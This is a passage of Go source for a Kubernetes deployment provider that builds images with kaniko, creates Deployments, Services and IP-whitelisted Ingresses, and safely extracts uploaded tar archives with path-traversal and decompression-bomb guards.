						// app's own quota: builds run as a Job, not part of the
						// app's permanent footprint.
						Resources: corev1.ResourceRequirements{
							Requests: corev1.ResourceList{
								corev1.ResourceCPU:    resource.MustParse("250m"),
								corev1.ResourceMemory: resource.MustParse("256Mi"),
							},
							Limits: corev1.ResourceList{
								corev1.ResourceCPU:    resource.MustParse("1"),
								corev1.ResourceMemory: resource.MustParse("512Mi"),
							},
						},
						// Platform-owned container: AllowPrivilegeEscalation=false
						// and drop ALL. ReadOnlyRootFilesystem is NOT set because
						// kaniko writes snapshot layers to its working directory.
						// RunAsNonRoot is NOT set — kaniko builds require uid=0 inside
						// the Kaniko executor to unpack layers that set file ownership.
						SecurityContext: func() *corev1.SecurityContext {
							falseVal := false
							// Capabilities are intentionally NOT dropped: kaniko
							// unpacks the build context + every image layer and
							// replays their chown/chmod/setuid (plus user
							// `RUN chown`/`COPY --chown`). Dropping ALL removes
							// CHOWN/DAC_OVERRIDE/FOWNER/SETUID/SETGID and kaniko
							// fails at the first step ("chown: operation not
							// permitted"). Build-pod isolation comes from the
							// per-namespace NetworkPolicy + resource limits.
							return &corev1.SecurityContext{
								AllowPrivilegeEscalation: &falseVal,
							}
						}(),
						VolumeMounts: mounts,
					}},
					Volumes: volumes,
				},
			},
		},
	}
	_, err := p.clientset.BatchV1().Jobs(ns).Create(ctx, job, metav1.CreateOptions{})
	return err
}

// waitForJobComplete polls a Job until success or failure.
func (p *K8sProvider) waitForJobComplete(ctx context.Context, ns, jobName string, timeout time.Duration) error {
	deadline := time.Now().Add(timeout)
	for {
		if time.Now().After(deadline) {
			return fmt.Errorf("job %q timed out after %s", jobName, timeout)
		}
		job, err := p.clientset.BatchV1().Jobs(ns).Get(ctx, jobName, metav1.GetOptions{})
		if err != nil {
			return fmt.Errorf("poll job: %w", err)
		}
		for _, c := range job.Status.Conditions {
			if c.Type == batchv1.JobComplete && c.Status == corev1.ConditionTrue {
				return nil
			}
			if c.Type == batchv1.JobFailed && c.Status == corev1.ConditionTrue {
				return fmt.Errorf("job %q failed: %s", jobName, c.Message)
			}
		}
		select {
		case <-ctx.Done():
			return ctx.Err()
		case <-time.After(3 * time.Second):
		}
	}
}

// applyDeploymentInNS creates or updates the k8s Deployment for an app in the
// given namespace (the per-deployment namespace).
//
// Gap 1 fix (disk fill / noisy-neighbour DoS): the container spec now carries
// explicit ephemeral-storage request + limit so k8s evicts only THIS pod when
// it exceeds its disk budget instead of allowing it to fill the node disk and
// trigger cluster-wide DiskPressure. The LimitRange backstops any pod that
// bypasses this function, but belt-and-braces: every Deployment we create sets
// it explicitly.
func (p *K8sProvider) applyDeploymentInNS(
	ctx context.Context,
	ns, name, imageTag string,
	envVars map[string]string,
	port int,
	memReq, memLimit, cpuReq string,
	ephReq, ephLimit string,
) error {
	replicas := int32(1)
	// PullAlways because images are pushed under a single :latest tag — without
	// Always, k8s caches the old image on nodes and redeploys silently serve
	// stale content. Future: sha-pin the tag and switch back to IfNotPresent.
	pullPolicy := corev1.PullAlways
	saFalse := false
	appID := appIDFromDeployName(name)
	readinessProbe, livenessProbe, startupProbe := customerContainerProbes(port)

	desired := &appsv1.Deployment{
		ObjectMeta: metav1.ObjectMeta{
			Name:      name,
			Namespace: ns,
			Labels: map[string]string{
				labelApp:   "true",
				labelAppID: appID,
			},
		},
		Spec: appsv1.DeploymentSpec{
			Replicas: &replicas,
			Selector: &metav1.LabelSelector{
				MatchLabels: map[string]string{
					labelAppID: appID,
				},
			},
			Template: corev1.PodTemplateSpec{
				ObjectMeta: metav1.ObjectMeta{
					Labels: map[string]string{
						labelApp:   "true",
						labelAppID: appID,
					},
				},
				Spec: corev1.PodSpec{
					// Disable service account token auto-mount for security.
					AutomountServiceAccountToken: &saFalse,
					// Pod-level seccomp: RuntimeDefault restricts ~400 rarely-needed
					// but CVE-exploited syscalls (clone/CLONE_NEWUSER, keyctl, etc.).
					SecurityContext: customerPodSecCtx(),
					ImagePullSecrets: []corev1.LocalObjectReference{
						{Name: "ghcr-pull"},
					},
					Containers: []corev1.Container{
						{
							Name:            "app",
							Image:           imageTag,
							ImagePullPolicy: pullPolicy,
							Ports: []corev1.ContainerPort{
								{ContainerPort: int32(port), Protocol: corev1.ProtocolTCP},
							},
							Env: envVarsToK8s(envVars),
							// Container-level hardening: drop ALL capabilities, re-add only
							// NET_BIND_SERVICE (ports <1024), block privilege escalation.
							// RunAsNonRoot and ReadOnlyRootFilesystem are intentionally omitted
							// — see customerContainerSecCtx for rationale.
							SecurityContext: customerContainerSecCtx(),
							// TCP probes: readiness gates the "healthy" signal on real
							// reachability (a pod is Ready only once the app listens),
							// liveness restarts a hung container, and startup gives a
							// slow-booting app generous grace before the other two run.
							ReadinessProbe: readinessProbe,
							LivenessProbe:  livenessProbe,
							StartupProbe:   startupProbe,
							// Gap 1 fix: include ephemeral-storage so k8s evicts THIS pod
							// when it fills its disk quota instead of filling the node
							// disk and triggering cluster-wide DiskPressure eviction.
							Resources: corev1.ResourceRequirements{
								Requests: corev1.ResourceList{
									corev1.ResourceMemory:           resource.MustParse(memReq),
									corev1.ResourceCPU:              resource.MustParse(cpuReq),
									corev1.ResourceEphemeralStorage: resource.MustParse(ephReq),
								},
								Limits: corev1.ResourceList{
									corev1.ResourceMemory:           resource.MustParse(memLimit),
									corev1.ResourceEphemeralStorage: resource.MustParse(ephLimit),
								},
							},
						},
					},
				},
			},
		},
	}

	_, err := p.clientset.AppsV1().Deployments(ns).Get(ctx, name, metav1.GetOptions{})
	if apierrors.IsNotFound(err) {
		_, err = p.clientset.AppsV1().Deployments(ns).Create(ctx, desired, metav1.CreateOptions{})
		if err != nil {
			return fmt.Errorf("create deployment %q in %q: %w", name, ns, err)
		}
		return nil
	}
	if err != nil {
		return fmt.Errorf("get deployment %q in %q: %w", name, ns, err)
	}

	// Already exists — update.
	_, err = p.clientset.AppsV1().Deployments(ns).Update(ctx, desired, metav1.UpdateOptions{})
	if err != nil {
		return fmt.Errorf("update deployment %q in %q: %w", name, ns, err)
	}
	return nil
}

// applyServiceInNS creates or updates a NodePort Service in the per-deployment namespace.
// Returns the assigned NodePort (0 if service already existed).
func (p *K8sProvider) applyServiceInNS(ctx context.Context, ns, name, deployName, appID string, port int) (int, error) {
	desired := &corev1.Service{
		ObjectMeta: metav1.ObjectMeta{
			Name:      name,
			Namespace: ns,
			Labels: map[string]string{
				labelApp:   "true",
				labelAppID: appID,
			},
		},
		Spec: corev1.ServiceSpec{
			Type: corev1.ServiceTypeNodePort,
			Selector: map[string]string{
				labelAppID: appID,
			},
			Ports: []corev1.ServicePort{
				{
					Port:       int32(port),
					TargetPort: intstr.FromInt(port),
					Protocol:   corev1.ProtocolTCP,
				},
			},
		},
	}

	existing, err := p.clientset.CoreV1().Services(ns).Get(ctx, name, metav1.GetOptions{})
	if apierrors.IsNotFound(err) {
		svc, createErr := p.clientset.CoreV1().Services(ns).Create(ctx, desired, metav1.CreateOptions{})
		if createErr != nil {
			return 0, fmt.Errorf("create service %q in %q: %w", name, ns, createErr)
		}
		if len(svc.Spec.Ports) > 0 {
			return int(svc.Spec.Ports[0].NodePort), nil
		}
		return 0, nil
	}
	if err != nil {
		return 0, fmt.Errorf("get service %q in %q: %w", name, ns, err)
	}

	// Already exists — preserve the existing NodePort.
	nodePort := 0
	if len(existing.Spec.Ports) > 0 {
		nodePort = int(existing.Spec.Ports[0].NodePort)
	}
	return nodePort, nil
}

// ingressWhitelistAnnotation is the nginx ingress controller annotation that
// gates inbound traffic to a whitelist of IPs/CIDRs. Centralised here so the
// create path (applyIngressForDeploy) and the update path
// (UpdateAccessControl) refer to the same key — a typo in one used to silently
// produce a public ingress.
const ingressWhitelistAnnotation = "nginx.ingress.kubernetes.io/whitelist-source-range"

// buildIngressAccessAnnotations is the single source of truth for the access-
// control annotations applied to a deploy's Ingress. Both the create path
// (applyIngressForDeploy → POST /deploy/new) and the update path
// (UpdateAccessControl → PATCH /api/v1/deployments/:id) call this so the
// "private=true with N IPs" → annotation mapping cannot drift between the two.
//
// Returns a fresh map (callers may merge it into a larger annotations map).
// Empty allowedIPs on private=true is treated as "skip the annotation" — the
// handler validates non-empty up front; this is belt-and-suspenders against
// an accidental "allow nobody" ingress.
func buildIngressAccessAnnotations(private bool, allowedIPs []string) map[string]string {
	out := map[string]string{}
	if private && len(allowedIPs) > 0 {
		out[ingressWhitelistAnnotation] = strings.Join(allowedIPs, ",")
	}
	return out
}

// applyIngressForDeploy creates an Ingress for a single-service /deploy/new app.
//
// Mirrors the pattern used by K8sStackProvider.createIngress: when DEPLOY_DOMAIN
// is set, the ingress is exposed at "<app-id>.<DEPLOY_DOMAIN>" and (if CERT_ISSUER
// is set) annotated for cert-manager so a Let's Encrypt cert is issued via the
// configured cluster-issuer (HTTP-01 by default). When DEPLOY_DOMAIN is empty
// (e.g. local Rancher Desktop), no ingress is created and the caller falls back
// to the NodePort URL.
//
// When private is true, the Ingress also carries
// `nginx.ingress.kubernetes.io/whitelist-source-range` with allowedIPs
// comma-joined — only requests originating from one of those CIDRs reach the
// backend. nginx serves a 403 to everything else. private=false produces an
// Ingress identical to pre-private behaviour.
//
// Returns the public URL on success, or "" if no ingress was created (callers
// should then fall back to the NodePort URL).
func (p *K8sProvider) applyIngressForDeploy(ctx context.Context, ns, svcName, appID string, port int, private bool, allowedIPs []string) (string, error) {
	domain := os.Getenv("DEPLOY_DOMAIN")
	if domain == "" {
		// No public domain configured — skip ingress creation (local dev path).
		// On local dev the NodePort fallback bypasses nginx anyway, so the
		// private flag has no enforcement surface. We log it so the dev
		// understands the flag won't take effect until they wire DEPLOY_DOMAIN.
		if private {
			slog.Warn("k8s.applyIngressForDeploy: private=true but DEPLOY_DOMAIN is unset; no enforcement on local NodePort",
				"app_id", appID,
			)
		}
		return "", nil
	}
	host := appID + "." + domain
	pathType := networkingv1.PathTypePrefix

	annotations := map[string]string{}
	var tls []networkingv1.IngressTLS
	scheme := "http"
	if certIssuer := os.Getenv("CERT_ISSUER"); certIssuer != "" {
		annotations["cert-manager.io/cluster-issuer"] = certIssuer
		tls = []networkingv1.IngressTLS{{
			Hosts:      []string{host},
			SecretName: "app-" + appID + "-tls",
		}}
		scheme = "https"
	}
	// Private deploy → nginx whitelist-source-range. Centralised via
	// buildIngressAccessAnnotations so the create path and the PATCH-update
	// path (UpdateAccessControl) can never diverge on the annotation key.
	for k, v := range buildIngressAccessAnnotations(private, allowedIPs) {
		annotations[k] = v
	}
	publicURL := scheme + "://" + host

	ing := &networkingv1.Ingress{
		ObjectMeta: metav1.ObjectMeta{
			Name:        "app-" + appID,
			Namespace:   ns,
			Annotations: annotations,
			Labels: map[string]string{
				labelApp:   "true",
				labelAppID: appID,
			},
		},
		Spec: networkingv1.IngressSpec{
			TLS: tls,
			Rules: []networkingv1.IngressRule{
				{
					Host: host,
					IngressRuleValue: networkingv1.IngressRuleValue{
						HTTP: &networkingv1.HTTPIngressRuleValue{
							Paths: []networkingv1.HTTPIngressPath{
								{
									Path:     "/",
									PathType: &pathType,
									Backend: networkingv1.IngressBackend{
										Service: &networkingv1.IngressServiceBackend{
											Name: svcName,
											Port: networkingv1.ServiceBackendPort{
												Number: int32(port),
											},
										},
									},
								},
							},
						},
					},
				},
			},
		},
	}

	_, err := p.clientset.NetworkingV1().Ingresses(ns).Create(ctx, ing, metav1.CreateOptions{})
	if err != nil {
		if apierrors.IsAlreadyExists(err) {
			return publicURL, nil
		}
		if apierrors.IsForbidden(err) {
			return "", fmt.Errorf("create ingress %q in %q: RBAC forbidden — ensure the service account has networking.k8s.io/ingresses create permission: %w", "app-"+appID, ns, err)
		}
		return "", fmt.Errorf("create ingress %q in %q: %w", "app-"+appID, ns, err)
	}
	return publicURL, nil
}

// UpdateAccessControl patches the access-control annotations on an existing
// deploy's Ingress without rebuilding the image. Backs PATCH
// /api/v1/deployments/:id so a Pro+ user can flip a deploy public ↔ private or
// edit the allowed_ips list in-place.
//
// Semantics:
//
//   - private=false → strip the whitelist-source-range annotation entirely
//     (the Ingress becomes public). allowedIPs is ignored.
//   - private=true with non-empty allowedIPs → set the annotation to the
//     comma-joined list (REPLACE semantics — the new list is the new truth,
//     no append).
//   - private=true with empty allowedIPs is a no-op at the k8s layer
//     (handler validates non-empty up front; this is belt-and-suspenders).
//
// When DEPLOY_DOMAIN is unset (local dev) the deploy has no Ingress and this
// is a no-op — same warn breadcrumb the create path emits. Returns
// IsNotFound-style errors for callers that want to surface 404 separately
// from generic 503; today the handler treats either as a 503 because the
// DB row already reflects the intent and a redeploy heals divergence.
func (p *K8sProvider) UpdateAccessControl(ctx context.Context, appID string, private bool, allowedIPs []string) error {
	domain := os.Getenv("DEPLOY_DOMAIN")
	if domain == "" {
		slog.Warn("k8s.UpdateAccessControl: DEPLOY_DOMAIN unset; no Ingress to patch — DB-only update",
			"app_id", appID,
		)
		return nil
	}
	ns := deployNamespace(appID)
	name := "app-" + appID

	ing, err := p.clientset.NetworkingV1().Ingresses(ns).Get(ctx, name, metav1.GetOptions{})
	if err != nil {
		if apierrors.IsNotFound(err) {
			// The deploy row exists but the Ingress hasn't been created yet
			// (e.g. PATCH lands during the building window). Skip — the next
			// runDeploy will pick up the new private/allowed_ips from the DB
			// row via opts.Private / opts.AllowedIPs.
			slog.Info("k8s.UpdateAccessControl: ingress not yet created — DB-only update",
				"app_id", appID, "namespace", ns)
			return nil
		}
		return fmt.Errorf("get ingress %q in %q: %w", name, ns, err)
	}

	if ing.Annotations == nil {
		ing.Annotations = map[string]string{}
	}
	// Strip any prior whitelist annotation first so private=false reliably
	// produces a public Ingress regardless of what was there before.
	delete(ing.Annotations, ingressWhitelistAnnotation)
	for k, v := range buildIngressAccessAnnotations(private, allowedIPs) {
		ing.Annotations[k] = v
	}

	if _, err := p.clientset.NetworkingV1().Ingresses(ns).Update(ctx, ing, metav1.UpdateOptions{}); err != nil {
		return fmt.Errorf("update ingress %q in %q: %w", name, ns, err)
	}
	slog.Info("k8s.UpdateAccessControl: ingress annotations patched",
		"app_id", appID,
		"namespace", ns,
		"private", private,
		"allowed_ip_count", len(allowedIPs),
	)
	return nil
}

// deployIngressURL returns the public Ingress URL for an appID if DEPLOY_DOMAIN
// is configured. Caller uses this to compute the AppURL during Status/Redeploy
// without re-querying the k8s API (the value is deterministic from env + appID).
func deployIngressURL(appID string) string {
	domain := os.Getenv("DEPLOY_DOMAIN")
	if domain == "" {
		return ""
	}
	scheme := "http"
	if os.Getenv("CERT_ISSUER") != "" {
		scheme = "https"
	}
	return scheme + "://" + appID + "." + domain
}

// deploymentStatus translates k8s Deployment conditions and replica counts into
// one of: building|deploying|healthy|failed|stopped.
func deploymentStatus(deploy *appsv1.Deployment) string {
	// Check for failure conditions first.
	for _, cond := range deploy.Status.Conditions {
		if cond.Type == appsv1.DeploymentReplicaFailure && cond.Status == corev1.ConditionTrue {
			return "failed"
		}
	}

	if deploy.Status.AvailableReplicas >= 1 {
		return "healthy"
	}
	if deploy.Status.UpdatedReplicas > 0 || deploy.Status.UnavailableReplicas > 0 {
		return "deploying"
	}
	// No replicas scheduled yet.
	return "building"
}

// maxExtractedTarBytes caps the total uncompressed size extractTarGz will
// write. A crafted gzip bomb compresses to a few KB but expands to gigabytes;
// without a ceiling that fills the extraction volume. 512 MiB is comfortably
// above the 50 MiB handler-side upload limit yet well under any node disk.
const maxExtractedTarBytes int64 = 512 << 20

// extractTarGz extracts a gzipped tar archive to destDir.
//
// Only regular files and directories are materialised. Symlink / hardlink /
// device / fifo entries are skipped — a symlink entry can point outside
// destDir (the zip-slip guard only checks the entry's own path, not its
// target) and the build path has no need for them. Total extracted size is
// capped by maxExtractedTarBytes to defend against a decompression bomb.
func extractTarGz(data []byte, destDir string) error {
	gr, err := gzip.NewReader(bytes.NewReader(data))
	if err != nil {
		return fmt.Errorf("gzip reader: %w", err)
	}
	defer gr.Close()

	tr := tar.NewReader(gr)
	var written int64
	for {
		hdr, err := tr.Next()
		if errors.Is(err, io.EOF) {
			break
		}
		if err != nil {
			return fmt.Errorf("tar next: %w", err)
		}

		target := filepath.Join(destDir, hdr.Name)
		// Guard against zip-slip.
		if !isUnderDir(target, destDir) {
			return fmt.Errorf("tar entry %q attempts path traversal", hdr.Name)
		}

		switch hdr.Typeflag {
		case tar.TypeDir:
			if err := os.MkdirAll(target, 0o755); err != nil {
				return fmt.Errorf("mkdir %q: %w", target, err)
			}
		case tar.TypeReg:
			if err := os.MkdirAll(filepath.Dir(target), 0o755); err != nil {
				return fmt.Errorf("mkdir parent %q: %w", filepath.Dir(target), err)
			}
			f, err := os.OpenFile(target, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, os.FileMode(hdr.Mode))
			if err != nil {
				return fmt.Errorf("open file %q: %w", target, err)
			}
			// Cap the copy so a single oversized entry can't blow the budget;
			// LimitReader+EOF check detects truncation against the ceiling.
			remaining := maxExtractedTarBytes - written
			n, err := io.Copy(f, io.LimitReader(tr, remaining+1))
			f.Close()
			if err != nil {
				return fmt.Errorf("write file %q: %w", target, err)
			}
			written += n
			if written > maxExtractedTarBytes {
				return fmt.Errorf("tar archive exceeds %d byte extraction limit", maxExtractedTarBytes)
			}
		default:
			// Skip symlinks, hardlinks, devices, fifos — see func doc.
			continue
		}
	}
	return nil
}

// isUnderDir returns true if path is under (or equal to) base after cleaning.
func isUnderDir(path, base string) bool {
	rel, err := filepath.Rel(base, path)
	if err != nil {
		return false
	}
	return rel != ".." && len(rel) >= 2 && rel[:2] != ".."
}

// envVarsToK8s converts a string map to k8s EnvVar slice.
func envVarsToK8s(vars map[string]string) []corev1.EnvVar {
	result := make([]corev1.EnvVar, 0, len(vars))
	for k, v := range vars {
		result = append(result, corev1.EnvVar{Name: k, Value: v})
	}
	return result
}

// Naming helpers.

func deploymentName(appID string) string { return "app-" + appID }
func serviceName(appID string) string    { return "svc-" + appID }
func imageName(appID string) string {
	if reg := os.Getenv("BUILD_IMAGE_REGISTRY"); reg != "" {
		for len(reg) > 0 && reg[len(reg)-1] == '/' {
			reg = reg[:len(reg)-1]
		}
		return reg + "/" + appID + ":latest"
	}
	return imageRegistry + "/" + appID + ":latest"
}

func appIDFromDeployName(name string) string {
	if len(name) > 4 && name[:4] == "app-" {
		return name[4:]
	}
	return name
}

func appURL(nodePort int) string {
	if nodePort == 0 {
		return "http://localhost:0"
	}
	return fmt.Sprintf("http://localhost:%d", nodePort)
}

func int64Ptr(v int64) *int64 { return &v }
